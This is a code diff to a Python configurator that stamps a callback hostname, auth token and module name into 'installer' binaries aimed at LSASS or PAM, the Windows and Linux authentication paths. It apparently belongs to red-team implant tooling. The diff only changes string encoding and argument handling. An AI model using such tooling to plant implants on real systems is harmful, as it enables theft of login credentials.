@@ -9,9 +9,9 @@ BANG_INSTALLER_LSASS = "installer.exe"
 BANG_INSTALLER_PAM = "installer"
 
 # stamped configuration values - found and replaced in the installer binary
-BANG_MODULE_NAME_STAMP = "BASKETBALLJONES".encode("utf-16-le")
-BANG_HOSTNAME_STAMP = "EVERYBODYGETUP".encode("utf-16-le")
-BANG_AUTH_TOKEN_STAMP = "00000000-0000-0000-0000-000000000000".encode("utf-16-le")
+BANG_MODULE_NAME_STAMP = "BASKETBALLJONES"
+BANG_HOSTNAME_STAMP = "EVERYBODYGETUP"
+BANG_AUTH_TOKEN_STAMP = "00000000-0000-0000-0000-000000000000"
 
 
 def _stamp_value(binary: bytes, stamp_pattern: bytes, stamp_data: bytes) -> bytes:
@@ -28,22 +28,25 @@ def configure_bang_installer(
 ) -> bytes:
     configuration = "debug" if debug else "release"
     filename = BANG_INSTALLER_LSASS if target == "lsass" else BANG_INSTALLER_PAM
+    encoding = "utf-16-le" if target == "lsass" else "utf-8"
 
     installer_path = EXPORT_DIR / target / configuration / filename
     with open(installer_path, "rb") as f:
         installer_bin = f.read()
 
-    installer_bin = _stamp_value(installer_bin, BANG_HOSTNAME_STAMP, hostname.encode("utf-16-le"))
-    installer_bin = _stamp_value(installer_bin, BANG_AUTH_TOKEN_STAMP, auth_token.encode("utf-16-le"))
-    installer_bin = _stamp_value(installer_bin, BANG_MODULE_NAME_STAMP, module_name.encode("utf-16-le"))
+    installer_bin = _stamp_value(installer_bin, BANG_HOSTNAME_STAMP.encode(encoding), hostname.encode(encoding))
+    installer_bin = _stamp_value(installer_bin, BANG_AUTH_TOKEN_STAMP.encode(encoding), auth_token.encode(encoding))
+    installer_bin = _stamp_value(installer_bin, BANG_MODULE_NAME_STAMP.encode(encoding), module_name.encode(encoding))
 
     return installer_bin
 
 
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument("--module-name", default="bang", help="Name for the module (does not include file extension)")
-    parser.add_argument("--hostname", default="172.17.224.1", help="HTTPS hostname")
+    parser.add_argument(
+        "--module-name", default="bang", help="Name for the module (does not include file extension)"
+    )
+    parser.add_argument("--hostname", required=True, help="HTTPS hostname")
     parser.add_argument(
         "--auth-token", default="00000000-0000-0000-0000-000000000000", help="API token (UUID)"
     )
